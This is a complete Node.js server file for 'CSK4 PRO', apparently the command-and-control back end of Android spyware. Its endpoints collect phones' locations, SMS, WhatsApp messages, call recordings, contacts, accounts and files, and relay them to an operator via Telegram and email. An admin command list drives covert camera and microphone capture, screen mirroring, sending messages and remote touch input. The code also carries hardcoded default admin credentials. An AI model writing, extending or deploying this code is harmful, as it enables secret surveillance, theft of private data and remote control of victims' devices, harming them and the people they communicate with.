const express = require('express');
const http = require('http');
const path = require('path');
const cors = require('cors');
const multer = require('multer');
const bodyParser = require('body-parser');
const compression = require('compression');
const helmet = require('helmet');
const { Server } = require('socket.io');
const nodemailer = require('nodemailer');
const fs = require('fs');
require('dotenv').config();

// 🆕 NEW IMPORTS
const mongoDB = require('./db');
const telegram = require('./telegram');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*' },
  maxHttpBufferSize: 2e8,
  pingTimeout: 60000,
  pingInterval: 25000
});

// ============ CONFIG ============
const CONFIG = {
  ADMIN_USER: process.env.ADMIN_USER || 'admin',
  ADMIN_PASS: process.env.ADMIN_PASS || 'csk4@2024',
  DEVICE_TOKEN: process.env.DEVICE_TOKEN || 'CSK4-DEVICE-SECRET-123',
  PORT: process.env.PORT || 4000,
  EMAIL_USER: process.env.EMAIL_USER || '',
  EMAIL_PASS: process.env.EMAIL_PASS || '',
  EMAIL_TO: process.env.EMAIL_TO || '',
  ENABLE_EMAIL: process.env.ENABLE_EMAIL === 'true',
  MAX_EMAILS_PER_HOUR: parseInt(process.env.MAX_EMAILS_PER_HOUR) || 100
};

// ============ EMAIL SETUP ============
let transporter = null;
if (CONFIG.ENABLE_EMAIL && CONFIG.EMAIL_USER && CONFIG.EMAIL_PASS) {
  transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: { user: CONFIG.EMAIL_USER, pass: CONFIG.EMAIL_PASS }
  });
  console.log('📧 Email enabled for:', CONFIG.EMAIL_USER);
}

let emailCount = 0;
let emailResetTime = Date.now();

async function sendEmail(subject, body, attachments = []) {
  if (!transporter || !CONFIG.ENABLE_EMAIL) return;
  if (Date.now() - emailResetTime > 3600000) {
    emailCount = 0;
    emailResetTime = Date.now();
  }
  if (emailCount >= CONFIG.MAX_EMAILS_PER_HOUR) {
    console.log('⚠️ Email rate limit reached');
    return;
  }
  try {
    await transporter.sendMail({
      from: `"CSK4 Server" <${CONFIG.EMAIL_USER}>`,
      to: CONFIG.EMAIL_TO,
      subject: subject,
      text: body,
      attachments: attachments
    });
    emailCount++;
    console.log('📧 Email sent:', subject);
  } catch (e) {
    console.error('❌ Email fail:', e.message);
  }
}

// ============ DUAL NOTIFICATION (Telegram + Email) ============
async function notify(subject, body) {
  // Send to Telegram (FAST)
  telegram.sendMessage(`<b>${subject}</b>\n\n${body}`).catch(() => {});
  // Send to Email (BACKUP)
  sendEmail(subject, body).catch(() => {});
}

// ============ MIDDLEWARE ============
app.use(helmet({ contentSecurityPolicy: false }));
app.use(compression());
app.use(cors());
app.use(bodyParser.json({ limit: '200mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '200mb' }));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

if (!fs.existsSync('./uploads')) fs.mkdirSync('./uploads');

// ============ UPLOAD ============
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, './uploads/'),
  filename: (req, file, cb) => {
    const safe = file.originalname.replace(/[^a-zA-Z0-9.]/g, '_');
    cb(null, Date.now() + '-' + safe);
  }
});
const upload = multer({ storage, limits: { fileSize: 200 * 1024 * 1024 } });

// ============ IN-MEMORY CACHE (fallback) ============
let devices = {};
let locations = [];
let contacts = [];
let files = [];
let photos = [];
let videos = [];
let audioRec = [];
let nearbyDevices = [];
let messages = [];
let commands = [];
let deviceInfo = {};
let callLogs = [];
let installedApps = [];
let screenshots = [];
let bluetoothDevices = [];
let notifications = [];
let whatsappMessages = [];
let activities = [];
let callRecordings = [];
let simInfo = {};
let accountsInfo = {};
let emailsInfo = {};

// ============ INITIALIZE ============
async function initialize() {
  try {
    // Connect to MongoDB
    await mongoDB.connect();
    console.log('✅ MongoDB connected');
    
    // Load existing data from MongoDB
    const savedData = await mongoDB.loadAllData();
    if (savedData) {
      devices = savedData.devices || {};
      locations = savedData.locations || [];
      contacts = savedData.contacts || [];
      files = savedData.files || [];
      photos = savedData.photos || [];
      videos = savedData.videos || [];
      audioRec = savedData.audio || [];
      messages = savedData.messages || [];
      callLogs = savedData.callLogs || [];
      callRecordings = savedData.callRecordings || [];
      installedApps = savedData.apps || [];
      screenshots = savedData.screenshots || [];
      bluetoothDevices = savedData.bluetooth || [];
      notifications = savedData.notifications || [];
      whatsappMessages = savedData.whatsapp || [];
      activities = savedData.activities || [];
      simInfo = savedData.simInfo || {};
      accountsInfo = savedData.accounts || {};
      emailsInfo = savedData.emails || {};
      commands = savedData.commands || [];
      deviceInfo = savedData.deviceInfo || {};
      
      console.log(`📊 Loaded from MongoDB:`);
      console.log(`   Devices: ${Object.keys(devices).length}`);
      console.log(`   Contacts: ${contacts.length}`);
      console.log(`   Messages: ${messages.length}`);
    }
    
    // Initialize Telegram
    telegram.init();
    
  } catch (error) {
    console.error('❌ Initialization error:', error.message);
  }
}

// ============ DEVICE ENDPOINTS ============

app.post('/api/device/register', async (req, res) => {
  const { deviceId, deviceName, token, model, android, battery } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid token' });
  
  const device = {
    deviceId,
    deviceName: deviceName || 'Unknown',
    model: model || deviceName,
    android: android || 'Unknown',
    battery: battery || 0,
    lastSeen: new Date(),
    online: true,
    ip: req.ip
  };
  
  devices[deviceId] = device;
  
  // 💾 Save to MongoDB
  await mongoDB.updateOne(mongoDB.COLLECTIONS.DEVICES, { deviceId }, device);
  
  io.emit('device-update', devices);
  console.log(`✅ ${deviceName} (${deviceId})`);
  
  // 🔔 Notify
  telegram.notifyDeviceOnline(deviceName, deviceId, model, android, battery);
  
  res.json({ success: true });
});

app.post('/api/device/heartbeat', async (req, res) => {
  const { deviceId, token, battery } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  if (devices[deviceId]) {
    devices[deviceId].lastSeen = new Date();
    devices[deviceId].online = true;
    if (battery !== undefined) devices[deviceId].battery = battery;
  }
  io.emit('device-update', devices);
  res.json({ success: true });
});

app.post('/api/device/location', async (req, res) => {
  const { deviceId, lat, lng, accuracy, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  const entry = { deviceId, lat, lng, accuracy, time: new Date() };
  locations.push(entry);
  if (locations.length > 5000) locations.shift();
  
  // 💾 Save to MongoDB
  await mongoDB.save(mongoDB.COLLECTIONS.LOCATIONS, entry);
  
  io.emit('new-location', entry);
  
  const deviceName = devices[deviceId]?.deviceName || deviceId;
  telegram.notifyLocation(deviceName, lat, lng, accuracy);
  sendEmail(`📍 Location Update`, `Device: ${deviceName}\nLat: ${lat}\nLng: ${lng}\nMaps: https://maps.google.com/?q=${lat},${lng}`);
  
  res.json({ success: true });
});

app.post('/api/device/contacts', async (req, res) => {
  const { deviceId, contacts: list, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  // Clear old and save new
  contacts = contacts.filter(c => c.deviceId !== deviceId);
  const newContacts = list.map(c => ({ deviceId, name: c.name, phone: c.phone, type: c.type }));
  contacts.push(...newContacts);
  
  // 💾 Save to MongoDB
  await mongoDB.remove(mongoDB.COLLECTIONS.CONTACTS, { deviceId });
  await mongoDB.saveMany(mongoDB.COLLECTIONS.CONTACTS, newContacts);
  
  io.emit('contacts-update', contacts);
  console.log(`👥 Contacts saved: ${list.length}`);
  
  res.json({ success: true, count: list.length });
});

app.post('/api/device/messages', async (req, res) => {
  const { deviceId, messages: list, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  messages = messages.filter(m => m.deviceId !== deviceId);
  const newMessages = list.map(m => ({ deviceId, from: m.from, body: m.body, time: m.time, type: m.type }));
  messages.push(...newMessages);
  
  // 💾 Save to MongoDB
  await mongoDB.remove(mongoDB.COLLECTIONS.MESSAGES, { deviceId });
  await mongoDB.saveMany(mongoDB.COLLECTIONS.MESSAGES, newMessages);
  
  io.emit('messages-update', messages);
  console.log(`💬 Messages saved: ${list.length}`);
  
  res.json({ success: true });
});

app.post('/api/device/calllogs', async (req, res) => {
  const { deviceId, callLogs: list, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  callLogs = callLogs.filter(c => c.deviceId !== deviceId);
  const newLogs = list.map(c => ({ deviceId, ...c }));
  callLogs.push(...newLogs);
  
  await mongoDB.remove(mongoDB.COLLECTIONS.CALL_LOGS, { deviceId });
  await mongoDB.saveMany(mongoDB.COLLECTIONS.CALL_LOGS, newLogs);
  
  io.emit('calllogs-update', callLogs);
  res.json({ success: true });
});

app.post('/api/device/apps', async (req, res) => {
  const { deviceId, apps, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  installedApps = installedApps.filter(a => a.deviceId !== deviceId);
  const newApps = apps.map(a => ({ deviceId, ...a }));
  installedApps.push(...newApps);
  
  await mongoDB.remove(mongoDB.COLLECTIONS.APPS, { deviceId });
  await mongoDB.saveMany(mongoDB.COLLECTIONS.APPS, newApps);
  
  io.emit('apps-update', installedApps);
  res.json({ success: true });
});

app.post('/api/device/bluetooth', async (req, res) => {
  const { deviceId, devices: list, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  bluetoothDevices = bluetoothDevices.filter(d => d.deviceId !== deviceId);
  const newDevices = list.map(d => ({ deviceId, ...d }));
  bluetoothDevices.push(...newDevices);
  
  await mongoDB.remove(mongoDB.COLLECTIONS.BLUETOOTH, { deviceId });
  await mongoDB.saveMany(mongoDB.COLLECTIONS.BLUETOOTH, newDevices);
  
  io.emit('bluetooth-update', bluetoothDevices);
  res.json({ success: true });
});

app.post('/api/device/info', async (req, res) => {
  const { deviceId, info, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  deviceInfo[deviceId] = { ...info, time: new Date() };
  await mongoDB.updateOne(mongoDB.COLLECTIONS.DEVICE_INFO, { deviceId }, { deviceId, ...info });
  
  io.emit('info-update', deviceInfo);
  res.json({ success: true });
});

// ============ NOTIFICATIONS ============
app.post('/api/device/notification', async (req, res) => {
  const { deviceId, package: pkg, title, text, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  const entry = { deviceId, package: pkg, title, text, time: new Date() };
  notifications.push(entry);
  if (notifications.length > 1000) notifications.shift();
  
  await mongoDB.save(mongoDB.COLLECTIONS.NOTIFICATIONS, entry);
  
  io.emit('new-notification', entry);
  
  const deviceName = devices[deviceId]?.deviceName || deviceId;
  telegram.notifyNotification(deviceName, pkg, title, text);
  
  res.json({ success: true });
});

// ============ WHATSAPP ============
app.post('/api/device/whatsapp', async (req, res) => {
  const { deviceId, from, message, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  const entry = { deviceId, from, message, time: new Date() };
  whatsappMessages.push(entry);
  if (whatsappMessages.length > 1000) whatsappMessages.shift();
  
  await mongoDB.save(mongoDB.COLLECTIONS.WHATSAPP, entry);
  
  io.emit('whatsapp-update', whatsappMessages);
  
  const deviceName = devices[deviceId]?.deviceName || deviceId;
  telegram.notifyWhatsApp(deviceName, from, message);
  
  res.json({ success: true });
});

// ============ ACTIVITIES ============
app.post('/api/device/activity', async (req, res) => {
  const { deviceId, type, data, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  const entry = { deviceId, type, data, time: new Date() };
  activities.push(entry);
  if (activities.length > 2000) activities.shift();
  
  await mongoDB.save(mongoDB.COLLECTIONS.ACTIVITIES, entry);
  
  io.emit('activity-update', activities);
  res.json({ success: true });
});

// ============ CALL RECORDING ============
app.post('/api/device/callrecording', upload.single('file'), async (req, res) => {
  const { deviceId, number, duration, type, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  if (!req.file) return res.status(400).json({ error: 'No file' });
  
  const entry = {
    deviceId, number, duration, type,
    filename: req.file.filename,
    url: `/uploads/${req.file.filename}`,
    time: new Date()
  };
  callRecordings.push(entry);
  
  await mongoDB.save(mongoDB.COLLECTIONS.CALL_RECORDINGS, entry);
  
  io.emit('callrecording-update', callRecordings);
  
  const deviceName = devices[deviceId]?.deviceName || deviceId;
  telegram.notifyCallRecording(deviceName, number, duration, entry.url);
  
  res.json({ success: true });
});

// ============ SIM INFO ============
app.post('/api/device/siminfo', async (req, res) => {
  const { deviceId, sims, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  const entry = { deviceId, sims, time: new Date() };
  simInfo[deviceId] = entry;
  
  await mongoDB.updateOne(mongoDB.COLLECTIONS.SIM_INFO, { deviceId }, entry);
  
  io.emit('siminfo-update', simInfo);
  
  const deviceName = devices[deviceId]?.deviceName || deviceId;
  telegram.notifySimInfo(deviceName, sims);
  
  res.json({ success: true });
});

// ============ ACCOUNTS ============
app.post('/api/device/accounts', async (req, res) => {
  const { deviceId, accounts, total, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  const entry = { deviceId, accounts, total, time: new Date() };
  accountsInfo[deviceId] = entry;
  
  await mongoDB.updateOne(mongoDB.COLLECTIONS.ACCOUNTS, { deviceId }, entry);
  
  io.emit('accounts-update', accountsInfo);
  
  const deviceName = devices[deviceId]?.deviceName || deviceId;
  telegram.notifyAccounts(deviceName, accounts);
  
  res.json({ success: true });
});

// ============ EMAILS ============
app.post('/api/device/emails', async (req, res) => {
  const { deviceId, emails, total, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  
  const entry = { deviceId, emails, total, time: new Date() };
  emailsInfo[deviceId] = entry;
  
  await mongoDB.updateOne(mongoDB.COLLECTIONS.EMAILS, { deviceId }, entry);
  
  io.emit('emails-update', emailsInfo);
  
  const deviceName = devices[deviceId]?.deviceName || deviceId;
  telegram.notifyEmails(deviceName, emails);
  
  res.json({ success: true });
});

// ============ FILE UPLOAD ============
app.post('/api/device/upload', upload.single('file'), async (req, res) => {
  const { deviceId, type, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  if (!req.file) return res.status(400).json({ error: 'No file' });
  
  const entry = {
    deviceId,
    type: type || 'file',
    filename: req.file.filename,
    originalName: req.file.originalname,
    url: `/uploads/${req.file.filename}`,
    size: req.file.size,
    time: new Date()
  };
  
  const deviceName = devices[deviceId]?.deviceName || deviceId;
  
  if (type === 'photo') {
    photos.push(entry);
    await mongoDB.save(mongoDB.COLLECTIONS.PHOTOS, entry);
    telegram.notifyPhoto(deviceName, entry.url);
  } else if (type === 'video') {
    videos.push(entry);
    await mongoDB.save(mongoDB.COLLECTIONS.VIDEOS, entry);
    telegram.notifyVideo(deviceName, entry.url);
  } else if (type === 'audio') {
    audioRec.push(entry);
    await mongoDB.save(mongoDB.COLLECTIONS.AUDIO, entry);
    telegram.notifyAudio(deviceName, entry.url);
  } else if (type === 'screenshot') {
    screenshots.push(entry);
    await mongoDB.save(mongoDB.COLLECTIONS.SCREENSHOTS, entry);
    telegram.notifyPhoto(deviceName, entry.url);
  } else {
    files.push(entry);
    await mongoDB.save(mongoDB.COLLECTIONS.FILES, entry);
  }
  
  io.emit('new-file', entry);
  res.json({ success: true, file: entry });
});

// ============ COMMANDS ============
app.get('/api/device/commands/:deviceId', (req, res) => {
  const pending = commands.filter(c => c.deviceId === req.params.deviceId && c.status === 'pending');
  res.json({ commands: pending });
});

app.post('/api/device/command-done', async (req, res) => {
  const { commandId, result } = req.body;
  const cmd = commands.find(c => c.id === commandId);
  if (cmd) {
    cmd.status = 'done';
    cmd.result = result;
    await mongoDB.updateOne(mongoDB.COLLECTIONS.COMMANDS, { id: commandId }, { status: 'done', result });
  }
  res.json({ success: true });
});

// ============ ADMIN ENDPOINTS ============

app.post('/api/admin/login', (req, res) => {
  const { username, password } = req.body;
  if (username === CONFIG.ADMIN_USER && password === CONFIG.ADMIN_PASS) {
    res.json({ success: true, token: 'csk4-admin-' + Date.now() });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

app.get('/api/admin/data', async (req, res) => {
  const stats = {
    totalDevices: Object.keys(devices).length,
    onlineDevices: Object.values(devices).filter(d => d.online).length,
    totalPhotos: photos.length,
    totalVideos: videos.length,
    totalFiles: files.length,
    totalContacts: contacts.length,
    totalLocations: locations.length,
    totalMessages: messages.length,
    totalApps: installedApps.length,
    totalBluetooth: bluetoothDevices.length,
    totalScreenshots: screenshots.length,
    totalNotifications: notifications.length,
    totalWhatsapp: whatsappMessages.length,
    totalActivities: activities.length,
    totalCallRecordings: callRecordings.length,
    totalSims: Object.keys(simInfo).length,
    totalAccounts: Object.values(accountsInfo).reduce((s, a) => s + (a.total || 0), 0),
    totalEmails: Object.values(emailsInfo).reduce((s, e) => s + (e.total || 0), 0)
  };
  
  res.json({
    devices, locations, contacts, files, photos, videos,
    audio: audioRec, nearby: nearbyDevices, bluetooth: bluetoothDevices,
    messages, callLogs, apps: installedApps, deviceInfo, commands, screenshots,
    notifications, whatsapp: whatsappMessages, activities, callRecordings,
    simInfo, accounts: accountsInfo, emails: emailsInfo,
    stats
  });
});

app.post('/api/admin/command', async (req, res) => {
  const { deviceId, command, params } = req.body;
  const validCommands = [
    'take_photo_front', 'take_photo_back', 'record_video_front', 'record_video_back',
    'record_audio', 'screenshot', 'lock_screen',
    'get_location', 'get_contacts', 'get_messages', 'get_calllogs',
    'get_files', 'get_apps', 'get_nearby', 'get_bluetooth', 'get_info',
    'get_sim_info', 'get_accounts', 'get_email_accounts',
    'vibrate', 'play_sound', 'flashlight_on', 'flashlight_off',
    'start_webrtc', 'start_audio_stream', 'stop_webrtc', 'switch_camera',
    'start_screen_mirror', 'stop_screen_mirror',
    'open_app', 'uninstall_app', 'force_stop_app',
    'set_brightness', 'set_volume', 'set_ring_mode',
    'send_sms', 'send_whatsapp', 'show_notification',
    'touch_tap', 'touch_swipe', 'touch_back', 'touch_home', 'touch_recent',
    'start_call_recording', 'stop_call_recording'
  ];
  if (!validCommands.includes(command)) return res.status(400).json({ error: 'Invalid command' });
  
  const cmd = {
    id: Date.now().toString() + Math.random().toString(36).substr(2, 5),
    deviceId, command, params: params || {},
    time: new Date(), status: 'pending'
  };
  commands.push(cmd);
  
  await mongoDB.save(mongoDB.COLLECTIONS.COMMANDS, cmd);
  
  io.to(deviceId).emit('command', cmd);
  console.log(`🎮 ${command} → ${deviceId}`);
  res.json({ success: true, command: cmd });
});

app.delete('/api/admin/device/:deviceId', async (req, res) => {
  const id = req.params.deviceId;
  delete devices[id];
  delete simInfo[id];
  delete accountsInfo[id];
  delete emailsInfo[id];
  
  await mongoDB.remove(mongoDB.COLLECTIONS.DEVICES, { deviceId: id });
  await mongoDB.remove(mongoDB.COLLECTIONS.LOCATIONS, { deviceId: id });
  await mongoDB.remove(mongoDB.COLLECTIONS.CONTACTS, { deviceId: id });
  await mongoDB.remove(mongoDB.COLLECTIONS.MESSAGES, { deviceId: id });
  
  io.emit('device-update', devices);
  res.json({ success: true });
});

// ============ SOCKET.IO ============
io.on('connection', (socket) => {
  console.log('🔌', socket.id);
  
  socket.on('register-device', (id) => {
    socket.join(id);
    console.log('📱 Device:', id);
  });
  
  socket.on('register-admin', () => {
    socket.join('admin-room');
    console.log('👤 Admin');
  });
  
  socket.on('webrtc-offer', (data) => io.to(data.target).emit('webrtc-offer', data));
  socket.on('webrtc-answer', (data) => io.to(data.target).emit('webrtc-answer', data));
  socket.on('webrtc-ice', (data) => io.to(data.target).emit('webrtc-ice', data));
  socket.on('screen-mirror-offer', (data) => io.to(data.target).emit('screen-mirror-offer', data));
  socket.on('screen-mirror-answer', (data) => io.to(data.target).emit('screen-mirror-answer', data));
  socket.on('screen-mirror-ice', (data) => io.to(data.target).emit('screen-mirror-ice', data));
  
  socket.on('disconnect', () => console.log('❌', socket.id));
});

// ============ START ============
initialize().then(() => {
  server.listen(CONFIG.PORT, '0.0.0.0', () => {
    console.log(`🚀 CSK4 PRO v4.0 running on port ${CONFIG.PORT}`);
    console.log(`   Admin Panel: http://localhost:${CONFIG.PORT}/`);
    console.log(`   Email: ${CONFIG.ENABLE_EMAIL ? '✅' : '❌'}`);
    console.log(`   MongoDB: ${mongoDB.isConnected() ? '✅' : '❌'}`);
    console.log(`   Telegram: ${telegram.getStatus().enabled ? '✅' : '❌'}`);
  });
});
